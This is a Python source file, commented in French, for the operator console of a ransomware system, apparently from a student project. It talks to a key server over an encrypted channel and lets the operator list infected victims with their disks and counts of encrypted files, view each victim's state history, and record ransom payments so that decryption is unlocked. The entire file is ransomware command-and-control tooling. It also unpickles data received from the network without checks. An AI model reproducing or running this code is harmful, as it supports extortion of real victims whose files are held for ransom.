import utile.network as network
import utile.message as message
import utile.security as security
import re
import sys
from datetime import datetime
import pickle

s_cli = network.conn_serv()
if not s_cli:
    sys.exit()

# Hellman (clé)
cle_chiffrement = security.hellman_client(s_cli)  # La clé commune de chiffrement

listed=False

while True and s_cli:
    print("CONSOLE DE CONTROLE")
    print("===================")
    print("1) Liste des victimes du ransomware")
    print("2) Historique des états d'une victime")
    print("3) Renseigner le payement de rançon d'une victime")
    print("4) Quitter")

    choice = input("Votre choix : ")
    if re.fullmatch("[1-4]", choice):
        choice=int(choice)
    else:
        print("ERREUR : Chiffre invalide\n")
        continue  # Revient au début de la boucle tant que le chiffre n'est pas valide
    if choice==4:
        s_cli.close()
        sys.exit()
    if choice == 1:  # Listing des victimes
        print("\nLISTING DES VICTIMES DU RANSOMWARE")
        print("----------------------------------")
        print(f"{'num':5s}{'id':14s}{'type':14s}{'disques':25s}{'status':12s}nb. de fichiers")
        msgg=message.set_msg("list_req")
        envoi=network.send_msg(s_cli, security.encrypt(pickle.dumps(msgg), cle_chiffrement))  # Envoi du message au serv de clés
        if envoi==1:
            sys.exit()
        response={"": ""}
        nombre_victimes = 0
        state_victims={}  # Dictionnaire pour garder en mémoire l'ID d'une victime avec son état lié
        # Boucle pour recevoir tous les messages et tous les afficher correctement
        while response is None or message.get_message_type(response)!="LIST_END":
            response=network.receiv_msg(s_cli)
            response=security.decrypt(response, cle_chiffrement)
            response=pickle.loads(response)
            if response is not None and message.get_message_type(response) == "VICTIM":
                if response['STATE'] in ("DECRYPT", "PROTECTED"):
                    print(f"{response['VICTIM']:04d} {response['HASH'][-12:]:14s}{response['OS']:14s}{response['DISKS']:25s}{response['STATE']:12s}{response['NB_FILES']} fichiers déchiffrés")
                else:
                    print(f"{response['VICTIM']:04d} {response['HASH'][-12:]:14s}{response['OS']:14s}{response['DISKS']:25s}{response['STATE']:12s}{response['NB_FILES']} fichiers chiffrés")
                state_victims[response['VICTIM']]=response['STATE']
                nombre_victimes+=1
        listed = True
    elif listed:  # Check si les victimes ont bien été listées
        if choice==2:  # Historiques
            print("\nHISTORIQUE DES ETATS D'UNE VICTIME")
            print("----------------------------------")
            print(nombre_victimes)
            num_victime = input(f"Entrez le numéro de la victime (de 1 à {nombre_victimes}) : ")
            if True:  # Regex pour avoir un num de victime valide
                msgg=message.set_msg("hist_req", [int(num_victime)])
                envoi = network.send_msg(s_cli, security.encrypt(pickle.dumps(msgg), cle_chiffrement))  # Envoi du message au serv de clés
                if envoi == 1:
                    sys.exit()
                response = {"": ""}
                # Boucle pour recevoir tous les messages et tous les afficher correctement
                while response is None or message.get_message_type(response) != "HIST_END":
                    response = network.receiv_msg(s_cli)
                    response = security.decrypt(response, cle_chiffrement)
                    response = pickle.loads(response)
                    if response is not None and message.get_message_type(response) == "HIST_RESP":
                        time=datetime.fromtimestamp(response["TIMESTAMP"])
                        date = time.strftime("%d/%m/%Y %H:%M:%S")
                        if response["NB_FILES"]==0:
                            print(f"{date} - {response['STATE']}")
                        else:
                            print(f"{date} - {response['STATE']:15s} - {response['NB_FILES']}")
            else:
                print("ERREUR : Numéro de victime invalide !\n")
                continue
        elif choice==3:  # Valider le payement
            print("\nVALIDER LE PAYEMENT DE RANCON D'UNE VICTIME")
            print("-------------------------------------------")
            confirmed=False
            while not confirmed:  # Boucle pour demander une autre victime si celle-ci ne peut pas passer en mode DECRYPT pour l'instant
                num_victime = input(f"Entrez le numéro de la victime (de 1 à {nombre_victimes}) : ")
                if True:
                    num_victime=int(num_victime)
                    if state_victims[num_victime] in ("PROTECTED", "INITIALIZE", "DECRYPT"):
                        print(f"ERREUR : La victime {num_victime} est en mode {state_victims[num_victime]}")
                    else:
                        msgg= message.set_msg("CHGSTATE", [num_victime, "DECRYPT"])
                        envoi = network.send_msg(s_cli, security.encrypt(pickle.dumps(msgg), cle_chiffrement))  # Changement de l'état en BD (via le serv de clés)
                        if not envoi:
                            print("La demande est transmise !")
                        else:
                            print("ERREUR : Demande non transmise")
                        confirmed=True
                else:
                    print("ERREUR : Numéro de victime invalide !\n")
                    break  # Sort de la boucle si on met un victime invalide
    else:
        print("ERREUR : Veuillez d'abord lister les victimes !\n")
        continue

    print()
